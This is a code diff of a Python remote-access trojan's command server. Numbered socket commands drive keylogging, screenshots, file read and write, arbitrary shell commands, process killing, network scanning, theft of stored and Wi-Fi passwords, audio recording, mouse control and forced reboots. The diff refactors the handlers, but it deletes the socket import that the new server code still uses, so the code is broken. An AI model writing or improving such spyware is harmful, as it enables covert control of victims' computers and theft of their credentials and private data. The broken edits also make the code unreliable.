@@ -8,13 +8,8 @@ from pynput import keyboard
 from PIL import ImageGrab
 import os
 import psutil
-import socket as sock
 import platform
 import netifaces
-import socket
-import struct
-import fcntl
-import ctypes
 import webbrowser
 import time
 import pyautogui
@@ -307,7 +302,6 @@ def handle_client(client_socket):
                 client_socket.sendall(''.join(keylogger_results).encode('utf-8'))
             elif command == '8':
                 capture_screen()
-                client_socket.sendall(b'Screenshot captured as screenshot.png')
             elif command == '9':
                 directory = client_socket.recv(1024).decode('utf-8')
                 files = list_files(directory)
@@ -317,22 +311,21 @@ def handle_client(client_socket):
                 content = read_file(path)
                 client_socket.sendall(content.encode('utf-8'))
             elif command == '11':
-                path = client_socket.recv(1024).decode('utf-8')
-                content = client_socket.recv(4096).decode('utf-8')
+                data = client_socket.recv(1024).decode('utf-8')
+                path, content = data.split('\n')
                 result = write_file(path, content)
                 client_socket.sendall(result.encode('utf-8'))
             elif command == '12':
                 processes = list_processes()
-                client_socket.sendall('\n'.join([str(p) for p in processes]).encode('utf-8'))
+                client_socket.sendall('\n'.join(str(p) for p in processes).encode('utf-8'))
             elif command == '13':
-                pid = int(client_socket.recv(1024).decode('utf-8'))
-                if kill_process(pid):
-                    client_socket.sendall(b'Process terminated successfully')
-                else:
-                    client_socket.sendall(b'Process not found')
+                pid = client_socket.recv(1024).decode('utf-8')
+                success = kill_process(pid)
+                client_socket.sendall(str(success).encode('utf-8'))
             elif command == '14':
-                ip_range = client_socket.recv(1024).decode('utf-8').split(',')
-                results = scan_network(ip_range)
+                ip_range = client_socket.recv(1024).decode('utf-8')
+                ips = ip_range.split(',')
+                results = scan_network(ips)
                 client_socket.sendall('\n'.join(results).encode('utf-8'))
             elif command == '15':
                 cmd = client_socket.recv(1024).decode('utf-8')
@@ -346,37 +339,31 @@ def handle_client(client_socket):
                 client_socket.sendall('\n'.join(interfaces).encode('utf-8'))
             elif command == '18':
                 connections = get_active_connections()
-                client_socket.sendall('\n'.join([str(conn) for conn in connections]).encode('utf-8'))
+                client_socket.sendall('\n'.join(str(conn) for conn in connections).encode('utf-8'))
             elif command == '19':
-                route_table = get_route_table()
-                client_socket.sendall(str(route_table).encode('utf-8'))
+                route = get_route_table()
+                client_socket.sendall(str(route).encode('utf-8'))
             elif command == '20':
-                dns_cache = get_dns_cache()
-                client_socket.sendall(str(dns_cache).encode('utf-8'))
+                dns = get_dns_cache()
+                client_socket.sendall(str(dns).encode('utf-8'))
             elif command == '21':
                 passwords = fetch_passwords()
                 client_socket.sendall(passwords.encode('utf-8'))
             elif command == '22':
                 reboot_computer()
-                client_socket.sendall(b'Rebooting computer')
             elif command == '23':
                 freeze_screen()
-                client_socket.sendall(b'Screen frozen')
             elif command == '24':
                 rick_roll()
-                client_socket.sendall(b'Playing Rick Roll')
             elif command == '25':
-                duration = int(client_socket.recv(1024).decode('utf-8'))
-                result = record_audio(duration)
-                client_socket.sendall(result.encode('utf-8'))
+                duration = client_socket.recv(1024).decode('utf-8')
+                record_audio(int(duration))
             elif command == '26':
-                x = int(client_socket.recv(1024).decode('utf-8'))
-                y = int(client_socket.recv(1024).decode('utf-8'))
-                move_mouse(x, y)
-                client_socket.sendall(b'Mouse moved')
+                data = client_socket.recv(1024).decode('utf-8')
+                x, y = data.split('\n')
+                move_mouse(int(x), int(y))
             elif command == '27':
                 click_mouse()
-                client_socket.sendall(b'Mouse clicked')
             elif command == '28':
                 passwords = get_wifi_passwords()
                 client_socket.sendall(passwords.encode('utf-8'))
@@ -402,23 +389,19 @@ def handle_client(client_socket):
                 url = client_socket.recv(1024).decode('utf-8')
                 content = fetch_github_content(url)
                 client_socket.sendall(content.encode('utf-8'))
-            else:
-                client_socket.sendall(b'Invalid command')
         except Exception as e:
             client_socket.sendall(str(e).encode('utf-8'))
-            break
 
 def start_server():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((HOST, PORT))
-    server.listen(5)
-    print(f"[*] Listening on {HOST}:{PORT}")
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        s.listen()
+        print(f'Server listening on {HOST}:{PORT}')
+        while True:
+            client_socket, addr = s.accept()
+            print(f'Connected by {addr}')
+            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
+            client_handler.start()
 
-    while True:
-        client_socket, addr = server.accept()
-        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
-        client_handler.start()
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     start_server()
